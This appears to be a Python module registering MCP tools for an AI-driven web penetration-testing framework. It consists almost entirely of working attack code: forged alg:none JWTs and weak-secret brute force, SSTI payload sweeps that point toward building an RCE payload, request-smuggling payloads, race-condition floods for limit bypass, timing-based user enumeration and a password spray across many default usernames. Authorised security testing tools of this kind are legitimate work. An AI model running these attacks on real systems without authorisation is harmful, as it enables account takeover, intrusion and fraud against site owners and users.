"""Web-probe MCP tools — reuses tools.attack_modules.modules.web / crypto_jwt / auth_creds entrypoints (split from god file)."""

from __future__ import annotations

from tools.attack_modules.modules.auth_creds import PasswordSpray as PasswordSprayModule
from tools.attack_modules.modules.crypto_jwt import JWTTamper as JWTTamperModule

# Reuse attack module entrypoints — single source is tools.attack_modules.modules.*
from tools.attack_modules.modules.web import (
    GraphQLIntrospect as GraphQLIntrospectModule,
)
from tools.attack_modules.modules.web import (
    RaceRequest as RaceRequestModule,
)
from tools.attack_modules.modules.web import (
    RequestSmuggling as RequestSmugglingModule,
)
from tools.attack_modules.modules.web import (
    SSTIProbe as SSTIProbeModule,
)
from tools.attack_modules.modules.web import (
    TimingOracle as TimingOracleModule,
)
from tools.mcp_tools.registry import *


def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
    workspace = ctx.workspace
    config = ctx.config
    search = ctx.search
    nvd = ctx.nvd
    researcher = ctx.researcher
    audit_tool = ctx.audit_tool
    require_allowlist = ctx.require_allowlist

    @mcp.tool()
    @require_allowlist()
    def jwt_tamper(target_ip: str, jwt_token: str = "") -> str:
        """Test JWT tokens for algorithm confusion (alg:none), HMAC key confusion, and weak secret brute-force. Provide a JWT token or leave empty to auto-discover from common endpoints."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."

        import base64 as _b64
        import hashlib as _hashlib
        import hmac as _hmac

        result_lines = [f"JWT_TAMPER_RESULTS: {target_ip}", ""]

        # If no token provided, try to discover one
        token = jwt_token.strip() if jwt_token else ""
        if not token:
            import socket as _sock

            # Phase 4: expanded discovery paths (Keycloak, WordPress, OAuth)
            for path in [
                "/api/auth/login",
                "/login",
                "/auth",
                "/api/token",
                "/api/v1/login",
                "/signin",
                "/oauth/token",
                "/api/me",
                "/api/session",
                "/api/auth/token",
                "/api/access-token",
                "/auth/realms/master/protocol/openid-connect/token",
                "/wp-json/jwt-auth/v1/token",
                "/.well-known/openid-configuration",
            ]:
                try:
                    with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                        s.settimeout(5)
                        s.connect((target_ip, 80))
                        s.sendall(f"GET {path} HTTP/1.0\r\nHost: {target_ip}\r\n\r\n".encode())
                        resp = s.recv(8192).decode(errors="replace")
                        match = re.search(r"[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}", resp)
                        if match:
                            token = match.group(0)
                            result_lines.append(f"Discovered JWT at {path}: {token[:60]}...")
                            break
                except Exception:  # ponytail: bare except intentional
                    pass

        if not token:
            return "\n".join(result_lines) + "\nNo JWT token found. Provide one via jwt_token parameter."

        parts = token.split(".")
        if len(parts) != 3:
            return "\n".join(result_lines) + "\nInvalid JWT format (expected header.payload.signature)."

        def _b64url_decode(data: str) -> bytes:
            data = data.replace("-", "+").replace("_", "/")
            padding = 4 - len(data) % 4
            if padding != 4:
                data += "=" * padding
            return _b64.b64decode(data)

        def _b64url_encode(data: bytes) -> str:
            return _b64.urlsafe_b64encode(data).rstrip(b"=").decode()

        try:
            header = json.loads(_b64url_decode(parts[0]))
            result_lines.append(f"Header: {json.dumps(header)}")
        except Exception:  # ponytail: bare except intentional
            header = {}
            result_lines.append("Header: (could not decode)")

        # Test 1: alg:none
        result_lines.append("")
        result_lines.append("--- alg:none attack ---")
        none_header = dict(header)
        none_header["alg"] = "none"
        none_token = f"{_b64url_encode(json.dumps(none_header).encode())}.{parts[1]}."
        result_lines.append(f"None-alg token: {none_token[:80]}...")
        result_lines.append("To test: curl -H 'Authorization: Bearer " + none_token + f"' http://{target_ip}/api/me")

        # Test 2: Weak HMAC secrets
        result_lines.append("")
        result_lines.append("--- Weak HMAC secret brute-force ---")
        alg = header.get("alg", "")
        if alg.startswith("HS"):
            hash_name = alg.replace("HS", "sha")
            # Phase 4: expanded weak-secret list (rockyou-top / jwt-secrets style)
            secrets = [
                "secret",
                "key",
                "jwt_secret",
                "private_key",
                "changeme",
                "password",
                "123456",
                "admin",
                "secret_key",
                "jwt-secret",
                "token",
                "auth",
                "supersecret",
                "qwerty",
                "letmein",
                "welcome",
                "administrator",
                "api_secret",
                "flask-secret",
                "django-insecure-",
                "node",
                "nodejs",
                "express",
                "nextauth",
                "supabase",
                "firebase",
                "prod",
                "staging",
                "dev",
                "test",
                "12345678",
                "password123",
                "secret123",
                "changethis",
            ]
            found_secrets = []
            for secret in secrets:
                try:
                    sig = _b64url_encode(
                        _hmac.new(
                            secret.encode(),
                            f"{parts[0]}.{parts[1]}".encode(),
                            getattr(_hashlib, hash_name, _hashlib.sha256),
                        ).digest()
                    )
                    if sig == parts[2]:
                        found_secrets.append(secret)
                except Exception:  # ponytail: bare except intentional
                    pass
            if found_secrets:
                result_lines.append(f"WEAK SECRET FOUND: {found_secrets}")
            else:
                result_lines.append("No weak secrets found from common list.")
        else:
            result_lines.append(f"Algorithm is {alg}, not HMAC-based. Try HMAC-to-RSA confusion if alg starts with RS.")

        # Test 3: HMAC-to-RSA confusion
        if alg.startswith("RS"):
            result_lines.append("")
            result_lines.append("--- HMAC-to-RSA key confusion ---")
            result_lines.append(
                "If RSA public key is exposed (/.well-known/jwks.json), change alg to HS256 and sign with the public key as HMAC secret."
            )

        return "\n".join(result_lines)

    @mcp.tool()
    @require_allowlist()
    def ssti_probe(target_ip: str, port: int = 80) -> str:
        """Probe for Server-Side Template Injection (SSTI) across Jinja2, Twig, Freemarker, Velocity, Smarty, and Mako engines. Tests math payloads and reports which engine is detected."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."

        import socket as _sock
        import urllib.parse as _urlparse

        result_lines = [f"SSTI_PROBE_RESULTS: {target_ip}:{port}", ""]

        math_payloads = [
            ("{{7*7}}", "49", "Jinja2/Twig"),
            ("${7*7}", "49", "Freemarker"),
            ("#{7*7}", "49", "Velocity"),
            ("<%= 7*7 %>", "49", "ERB/Ruby"),
            ("{{=7*7}}", "49", "Mako"),
            ("{7*7}", "49", "Smarty"),
            # Phase 4: additional engines + disambiguators
            ("<{7*7}>", "49", "StringTemplate"),
            ("{{7*'7'}}", "4977", "DotLiquid/Jinja2"),
            ("{% debug %}", "debug", "Pebble/Twig"),
            ("{{this.constructor.constructor('return 7')()}}", "7", "Handlebars"),
        ]

        endpoints = [
            "/",
            "/search",
            "/profile",
            "/user",
            "/page",
            "/render",
            "/preview",
            # Phase 4: template-render-heavy endpoints
            "/api/render",
            "/template",
            "/message",
            "/comment",
            "/email/preview",
            "/format",
            "/eval",
            "/compile",
            "/v1/render",
            "/admin/template",
        ]
        params = [
            "q",
            "search",
            "name",
            "username",
            "id",
            "page",
            "input",
            "data",
            # Phase 4: template/body params
            "template",
            "body",
            "content",
            "message",
            "text",
            "html",
            "subject",
            "recipient",
            "to",
            "from",
            "title",
        ]

        found_engine = None
        for ep in endpoints:
            for param in params:
                for payload, expected, engine in math_payloads:
                    try:
                        with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                            s.settimeout(5)
                            path = f"{ep}?{param}={_urlparse.quote(payload)}"
                            s.connect((target_ip, port))
                            s.sendall(f"GET {path} HTTP/1.0\r\nHost: {target_ip}\r\n\r\n".encode())
                            resp = s.recv(8192).decode(errors="replace")
                            if expected in resp:
                                result_lines.append(f"[DETECTED] {engine} at {ep}?{param}=<payload>")
                                result_lines.append(f"  Payload: {payload} -> reflected {expected}")
                                found_engine = engine
                                break
                    except Exception:  # ponytail: bare except intentional
                        pass
                if found_engine:
                    break
            if found_engine:
                break

        if not found_engine:
            result_lines.append("No SSTI detected on common endpoints.")
        else:
            result_lines.append("")
            result_lines.append(f"Engine: {found_engine}")
            result_lines.append("Use write_python_file to generate a full RCE payload for this engine.")

        return "\n".join(result_lines)

    @mcp.tool()
    @require_allowlist()
    def graphql_introspect(target_ip: str, port: int = 80) -> str:
        """Extract GraphQL schema via introspection query. Tests for query depth abuse, batching attacks, and alias-based resource exhaustion."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."

        import socket as _sock

        result_lines = [f"GRAPHQL_INTROSPECT_RESULTS: {target_ip}:{port}", ""]

        intro_query = json.dumps(
            {
                "query": """
            query { __schema { queryType { name } mutationType { name } types { name kind description fields { name } } } }
        """
            }
        )

        endpoints = [
            "/graphql",
            "/gql",
            "/api/graphql",
            "/v1/graphql",
            "/query",
            # Phase 4: expanded GraphQL surface
            "/api/v1/graphql",
            "/public/graphql",
            "/graphql/schema",
            "/api/schema",
            "/__graphql",
            "/api",
            "/graphql/batch",
            "/g",
        ]
        found = None

        for ep in endpoints:
            try:
                with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                    s.settimeout(8)
                    s.connect((target_ip, port))
                    body = intro_query.encode()
                    req = (
                        f"POST {ep} HTTP/1.0\r\n"
                        f"Host: {target_ip}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"\r\n"
                    ).encode() + body
                    s.sendall(req)
                    resp = s.recv(16384).decode(errors="replace")

                    if "__schema" in resp or "queryType" in resp:
                        found = ep
                        result_lines.append(f"[+] GraphQL endpoint found: {ep}")
                        result_lines.append("  Introspection ENABLED!")
                        # Extract type names
                        type_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', resp)
                        if type_matches:
                            result_lines.append(f"  Types exposed: {', '.join(type_matches[:20])}")
                        break
                    elif "graphql" in resp.lower() or "query" in resp.lower():
                        result_lines.append(f"[?] Possible GraphQL at {ep} (introspection may be disabled)")
            except Exception:  # ponytail: bare except intentional
                pass

        if not found:
            result_lines.append("No GraphQL endpoint found with introspection enabled.")

        # Batching test
        if found:
            result_lines.append("")
            result_lines.append("--- Batching attack test ---")
            batch_body = json.dumps(
                [
                    {"query": "{ __typename }"},
                    {"query": "{ __typename }"},
                    {"query": "{ __typename }"},
                    {"query": "{ __typename }"},
                    {"query": "{ __typename }"},
                ]
            ).encode()
            try:
                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                s.settimeout(8)
                s.connect((target_ip, port))
                req = (
                    f"POST {found} HTTP/1.0\r\n"
                    f"Host: {target_ip}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(batch_body)}\r\n"
                    f"\r\n"
                ).encode() + batch_body
                s.sendall(req)
                resp = s.recv(8192).decode(errors="replace")
                s.close()
                if resp.count("__typename") >= 5:
                    result_lines.append("[+] Batching ENABLED! Multiple queries processed in one request.")
                else:
                    result_lines.append("[-] Batching blocked or not supported.")
            except Exception:  # ponytail: bare except intentional
                result_lines.append("Batching test failed.")

        return "\n".join(result_lines)

    @mcp.tool()
    @require_allowlist()
    def race_request(target_ip: str, port: int = 80, endpoint: str = "/api/redeem", concurrent: int = 20) -> str:
        """Send N concurrent HTTP requests to exploit TOCTOU race conditions. Tests for coupon/limit bypass, double-spend, and rate-limit evasion. Use concurrent=20-100 for best results."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."
        if concurrent < 2 or concurrent > 200:
            return "BLOCKED: concurrent must be between 2 and 200."

        import concurrent.futures as _cf
        import socket as _sock
        import threading as _thr

        result_lines = [f"RACE_REQUEST_RESULTS: {target_ip}:{port}{endpoint}", ""]
        result_lines.append(f"Concurrent requests: {concurrent}")

        results = {"success": 0, "failure": 0, "statuses": []}
        lock = _thr.Lock()

        def _send_one() -> dict:
            try:
                with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                    s.settimeout(8)
                    s.connect((target_ip, port))
                    body = json.dumps({"code": "TEST100", "user": "attacker"}).encode()
                    req = (
                        f"POST {endpoint} HTTP/1.0\r\n"
                        f"Host: {target_ip}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"\r\n"
                    ).encode() + body
                    s.sendall(req)
                    resp = s.recv(4096).decode(errors="replace")
                    status_line = resp.split("\r\n")[0] if resp else ""
                    with lock:
                        if "200" in status_line or "201" in status_line:
                            results["success"] += 1
                        else:
                            results["failure"] += 1
                        results["statuses"].append(status_line[:100])
                    return {"status": status_line[:100]}
            except Exception as e:  # ponytail: bare except intentional
                with lock:
                    results["failure"] += 1
                return {"error": str(e)}

        start = time.monotonic()
        with _cf.ThreadPoolExecutor(max_workers=min(concurrent, 50)) as executor:
            futures = [executor.submit(_send_one) for _ in range(concurrent)]
            _cf.wait(futures, timeout=30)

        elapsed = time.monotonic() - start
        result_lines.append(f"Completed in {elapsed:.1f}s")
        result_lines.append(f"Success: {results['success']}, Failure: {results['failure']}")

        unique_statuses = set(s.split(" ")[1] if " " in s else s for s in results["statuses"] if s)
        if len(unique_statuses) > 1:
            result_lines.append(f"[!] Mixed status codes: {unique_statuses} — possible race condition!")
        if results["success"] > 1:
            result_lines.append(f"[!] {results['success']} requests succeeded — limit may be bypassed!")

        return "\n".join(result_lines)

    @mcp.tool()
    @require_allowlist()
    def timing_oracle(target_ip: str, port: int = 80) -> str:
        """Detect timing side-channels in login, password reset, and token validation endpoints. Measures response time differences for user enumeration and blind data extraction."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."

        import socket as _sock
        import statistics as _stats

        result_lines = [f"TIMING_ORACLE_RESULTS: {target_ip}:{port}", ""]

        def _measure(endpoint: str, body: str, samples: int = 8) -> list[float]:
            times = []
            for _ in range(samples):
                try:
                    with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                        s.settimeout(8)
                        s.connect((target_ip, port))
                        data = body.encode()
                        req = (
                            f"POST {endpoint} HTTP/1.0\r\n"
                            f"Host: {target_ip}\r\n"
                            f"Content-Type: application/json\r\n"
                            f"Content-Length: {len(data)}\r\n"
                            f"\r\n"
                        ).encode() + data
                        t0 = time.perf_counter()
                        s.sendall(req)
                        s.recv(4096)
                        elapsed = (time.perf_counter() - t0) * 1000
                        times.append(elapsed)
                except Exception:  # ponytail: bare except intentional
                    pass
                time.sleep(0.15)
            return times

        # Test login timing
        result_lines.append("--- Login timing (valid vs invalid user) ---")
        valid_times = _measure("/api/login", json.dumps({"username": "admin", "password": "wrong"}))
        invalid_times = _measure("/api/login", json.dumps({"username": "noexist_xyz", "password": "test"}))

        if len(valid_times) >= 3 and len(invalid_times) >= 3:
            mv = _stats.mean(valid_times)
            mi = _stats.mean(invalid_times)
            diff = abs(mv - mi)
            result_lines.append(f"  Valid user mean: {mv:.1f}ms, Invalid: {mi:.1f}ms, Diff: {diff:.1f}ms")
            if diff > 50:
                result_lines.append("  [+] TIMING ORACLE DETECTED! User enumeration possible via timing.")
            else:
                result_lines.append("  [-] No significant timing difference.")
        else:
            result_lines.append("  Insufficient samples.")

        # Test password reset timing
        result_lines.append("--- Password reset timing ---")
        exist_times = _measure("/api/reset-password", json.dumps({"email": "admin@example.com"}))
        noexist_times = _measure("/api/reset-password", json.dumps({"email": "noexist@example.com"}))

        if len(exist_times) >= 3 and len(noexist_times) >= 3:
            me = _stats.mean(exist_times)
            mn = _stats.mean(noexist_times)
            diff = abs(me - mn)
            result_lines.append(f"  Exist mean: {me:.1f}ms, No-exist: {mn:.1f}ms, Diff: {diff:.1f}ms")
            if diff > 50:
                result_lines.append("  [+] TIMING ORACLE DETECTED! Email enumeration via password reset.")
            else:
                result_lines.append("  [-] No significant timing difference.")
        else:
            result_lines.append("  Insufficient samples.")

        return "\n".join(result_lines)

    @mcp.tool()
    @require_allowlist()
    def request_smuggling_probe(target_ip: str, port: int = 80) -> str:
        """Test for HTTP request smuggling (CL.TE, TE.CL, TE.TE). Can detect cache poisoning and request hijacking vulnerabilities."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."

        import socket as _sock

        result_lines = [f"REQUEST_SMUGGLING_RESULTS: {target_ip}:{port}", ""]

        def _send_raw(payload: bytes) -> bytes:
            try:
                with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                    s.settimeout(10)
                    s.connect((target_ip, port))
                    s.sendall(payload)
                    time.sleep(0.5)
                    resp = b""
                    try:
                        while True:
                            chunk = s.recv(4096)
                            if not chunk:
                                break
                            resp += chunk
                    except _sock.timeout:
                        pass
                    return resp
            except Exception as e:  # ponytail: bare except intentional
                return f"ERROR: {e}".encode()

        # Baseline
        baseline = _send_raw(f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 0\r\n\r\n".encode())
        result_lines.append(f"Baseline: {len(baseline)} bytes")

        # CL.TE test
        result_lines.append("")
        result_lines.append("--- CL.TE test ---")
        cl_te = (
            f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
        ).encode()
        resp = _send_raw(cl_te)
        result_lines.append(f"Response: {len(resp)} bytes")
        if abs(len(resp) - len(baseline)) > 200:
            result_lines.append("[!] Response differs from baseline — possible CL.TE smuggling!")

        # TE.CL test
        result_lines.append("")
        result_lines.append("--- TE.CL test ---")
        te_cl = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()
        resp = _send_raw(te_cl)
        text = resp.decode(errors="replace")
        result_lines.append(f"Response: {len(resp)} bytes")
        if "GPOST" in text or "Unrecognized method" in text:
            result_lines.append("[+] SMUGGLING CONFIRMED! Back-end saw smuggled 'GPOST' request!")

        # TE.TE test
        result_lines.append("")
        result_lines.append("--- TE.TE test (obfuscated TE header) ---")
        te_te = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Transfer-encoding: x\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()
        resp = _send_raw(te_te)
        text = resp.decode(errors="replace")
        result_lines.append(f"Response: {len(resp)} bytes")
        if "GPOST" in text:
            result_lines.append("[+] SMUGGLING CONFIRMED via TE.TE obfuscation!")

        return "\n".join(result_lines)

    @mcp.tool()
    @require_allowlist()
    def password_spray(target_ip: str, port: int = 80, password: str = "Password1") -> str:
        """Spray one password across many common usernames. Low-and-slow to avoid account lockout. Use for initial access when you have no valid credentials."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."

        import socket as _sock

        result_lines = [f"PASSWORD_SPRAY_RESULTS: {target_ip}:{port}", f"Password: {password}", ""]

        users = [
            "admin",
            "administrator",
            "root",
            "user",
            "test",
            "guest",
            "info",
            "support",
            "sales",
            "marketing",
            "hr",
            "finance",
            "manager",
            "developer",
            "dev",
            "ops",
            "backup",
            "service",
            # Phase 4: service accounts, cloud defaults, app defaults
            "sql",
            "oracle",
            "sa",
            "postgres",
            "redis",
            "mongo",
            "cassandra",
            "elastic",
            "kibana",
            "jenkins",
            "gitlab",
            "grafana",
            "jira",
            "confluence",
            "svc_account",
            "svc_web",
            "svc_db",
            "ec2-user",
            "ssm-user",
            "centos",
            "fedora",
            "ubuntu",
            "sysadmin",
            "operator",
            "audit",
            "security",
            "readonly",
            "reports",
            "backup_admin",
        ]

        found = []
        for username in users:
            try:
                with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
                    s.settimeout(8)
                    s.connect((target_ip, port))
                    body = json.dumps({"username": username, "password": password}).encode()
                    req = (
                        f"POST /api/login HTTP/1.0\r\n"
                        f"Host: {target_ip}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"\r\n"
                    ).encode() + body
                    s.sendall(req)
                    resp = s.recv(4096).decode(errors="replace")

                    status_line = resp.split("\r\n")[0] if resp else ""
                    if "200" in status_line or "302" in status_line:
                        result_lines.append(f"  [+] {username}:{password} — SUCCESS ({status_line[:60]})")
                        found.append(username)
                    else:
                        result_lines.append(f"  [-] {username}:{password} — {status_line[:60]}")
            except Exception as e:  # ponytail: bare except intentional
                result_lines.append(f"  [!] {username} — error: {e}")
            time.sleep(1.5)  # Delay to avoid lockout

        if found:
            result_lines.append(f"\n[+] {len(found)} valid credentials found: {found}")
        else:
            result_lines.append("\n[-] No valid credentials found with this password.")

        return "\n".join(result_lines)
